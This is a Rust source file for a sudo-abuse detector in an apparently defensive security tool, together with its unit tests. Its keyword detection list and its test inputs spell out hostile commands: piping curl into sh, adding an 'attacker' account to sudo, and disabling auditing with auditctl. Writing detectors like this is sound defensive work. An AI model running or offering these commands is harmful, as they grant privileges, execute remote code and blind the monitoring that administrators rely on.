use std::collections::{BTreeSet, HashMap, VecDeque};

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{entities::EntityRef, event::Event, event::Severity, incident::Incident};

pub struct SudoAbuseDetector {
    threshold: usize,
    window: Duration,
    windows: HashMap<String, VecDeque<SudoEventSample>>,
    alerted: HashMap<String, DateTime<Utc>>,
    host: String,
}

#[derive(Clone)]
struct SudoEventSample {
    ts: DateTime<Utc>,
    command: String,
    reasons: Vec<String>,
}

impl SudoAbuseDetector {
    pub fn new(host: impl Into<String>, threshold: usize, window_seconds: u64) -> Self {
        Self {
            threshold,
            window: Duration::seconds(window_seconds as i64),
            windows: HashMap::new(),
            alerted: HashMap::new(),
            host: host.into(),
        }
    }

    /// Detect suspicious sudo activity bursts from a single user.
    ///
    /// Expected event contract:
    /// - kind: `sudo.command`
    /// - details.user: username
    /// - details.command: raw command string
    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        if event.kind != "sudo.command" {
            return None;
        }

        let user = event.details["user"].as_str()?.trim();
        if user.is_empty() {
            return None;
        }

        let command = event.details["command"].as_str()?.trim();
        if command.is_empty() {
            return None;
        }

        let reasons = classify_suspicious(command);
        if reasons.is_empty() {
            return None;
        }

        let now = event.ts;
        let cutoff = now - self.window;

        let entries = self.windows.entry(user.to_string()).or_default();
        while entries.front().is_some_and(|sample| sample.ts < cutoff) {
            entries.pop_front();
        }
        entries.push_back(SudoEventSample {
            ts: now,
            command: command.to_string(),
            reasons,
        });

        let count = entries.len();
        if count < self.threshold {
            return None;
        }

        if let Some(&last) = self.alerted.get(user) {
            if now - last < self.window {
                return None;
            }
        }

        self.alerted.insert(user.to_string(), now);

        let mut reason_set = BTreeSet::new();
        for sample in entries.iter() {
            for reason in &sample.reasons {
                reason_set.insert(reason.clone());
            }
        }

        let recent_commands: Vec<String> = entries
            .iter()
            .rev()
            .take(5)
            .map(|sample| sample.command.clone())
            .collect();

        let reasons: Vec<String> = reason_set.into_iter().collect();

        Some(Incident {
            ts: now,
            host: self.host.clone(),
            incident_id: format!("sudo_abuse:{user}:{}", now.format("%Y-%m-%dT%H:%MZ")),
            severity: Severity::Critical,
            title: format!("Suspicious sudo behavior detected for user {user}"),
            summary: format!(
                "{count} suspicious sudo commands by {user} in the last {} seconds",
                self.window.num_seconds()
            ),
            evidence: serde_json::json!([{
                "kind": "sudo.command",
                "user": user,
                "count": count,
                "window_seconds": self.window.num_seconds(),
                "reasons": reasons,
                "recent_commands": recent_commands,
            }]),
            recommended_checks: vec![
                format!("Review full sudo trail for user {user}"),
                "Validate if commands were authorized by change management".to_string(),
                "Temporarily suspend sudo access if activity is not expected".to_string(),
            ],
            tags: vec![
                "auth".to_string(),
                "sudo".to_string(),
                "privilege".to_string(),
                "abuse".to_string(),
            ],
            entities: vec![EntityRef::user(user.to_string())],
        })
    }
}

fn classify_suspicious(command: &str) -> Vec<String> {
    let lower = command.to_ascii_lowercase();
    let mut reasons = Vec::new();

    if lower.contains("useradd")
        || lower.contains("adduser")
        || lower.contains("usermod")
        || lower.contains("passwd")
        || lower.contains("chpasswd")
    {
        reasons.push("identity_change".to_string());
    }

    if lower.contains("visudo")
        || lower.contains("/etc/sudoers")
        || lower.contains("/etc/sudoers.d")
        || lower.contains("setfacl")
    {
        reasons.push("privilege_policy_change".to_string());
    }

    if lower.contains("iptables")
        || lower.contains("nft")
        || lower.contains("ufw disable")
        || lower.contains("auditctl")
    {
        reasons.push("security_control_change".to_string());
    }

    if (lower.contains("curl") || lower.contains("wget"))
        && (lower.contains("| sh")
            || lower.contains("| bash")
            || lower.contains("sh -c")
            || lower.contains("bash -c"))
    {
        reasons.push("remote_script_execution".to_string());
    }

    if lower.contains("systemctl stop")
        || lower.contains("systemctl disable")
        || lower.contains("kill -9")
    {
        reasons.push("service_disruption".to_string());
    }

    reasons
}

#[cfg(test)]
mod tests {
    use super::*;
    use innerwarden_core::event::Severity as Sev;

    fn sudo_event(user: &str, command: &str, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "host".to_string(),
            source: "journald".to_string(),
            kind: "sudo.command".to_string(),
            severity: Sev::Info,
            summary: format!("{user} ran sudo: {command}"),
            details: serde_json::json!({
                "user": user,
                "run_as": "root",
                "command": command,
            }),
            tags: vec!["auth".to_string(), "sudo".to_string()],
            entities: vec![EntityRef::user(user.to_string())],
        }
    }

    #[test]
    fn ignores_non_suspicious_sudo_commands() {
        let mut det = SudoAbuseDetector::new("host", 2, 300);
        let base = Utc::now();
        assert!(det
            .process(&sudo_event(
                "deploy",
                "/usr/bin/systemctl status nginx",
                base
            ))
            .is_none());
        assert!(det
            .process(&sudo_event(
                "deploy",
                "/usr/bin/journalctl -u nginx",
                base + Duration::seconds(1)
            ))
            .is_none());
    }

    #[test]
    fn emits_incident_at_threshold_for_same_user() {
        let mut det = SudoAbuseDetector::new("host", 2, 300);
        let base = Utc::now();
        assert!(det
            .process(&sudo_event("deploy", "usermod -aG sudo attacker", base))
            .is_none());
        let inc = det
            .process(&sudo_event(
                "deploy",
                "curl -fsSL http://x | sh",
                base + Duration::seconds(1),
            ))
            .expect("incident expected");
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.incident_id.starts_with("sudo_abuse:deploy:"));
        assert_eq!(inc.evidence[0]["count"], 2);
    }

    #[test]
    fn dedup_suppresses_realert_within_window() {
        let mut det = SudoAbuseDetector::new("host", 2, 300);
        let base = Utc::now();
        let _ = det.process(&sudo_event("deploy", "usermod -aG sudo attacker", base));
        let _ = det.process(&sudo_event(
            "deploy",
            "curl -fsSL http://x | sh",
            base + Duration::seconds(1),
        ));
        assert!(det
            .process(&sudo_event(
                "deploy",
                "auditctl -e 0",
                base + Duration::seconds(2)
            ))
            .is_none());
    }

    #[test]
    fn users_are_isolated() {
        let mut det = SudoAbuseDetector::new("host", 2, 300);
        let base = Utc::now();
        assert!(det
            .process(&sudo_event("alice", "usermod -aG sudo attacker", base))
            .is_none());
        assert!(det
            .process(&sudo_event(
                "bob",
                "curl -fsSL http://x | sh",
                base + Duration::seconds(1)
            ))
            .is_none());
    }
}
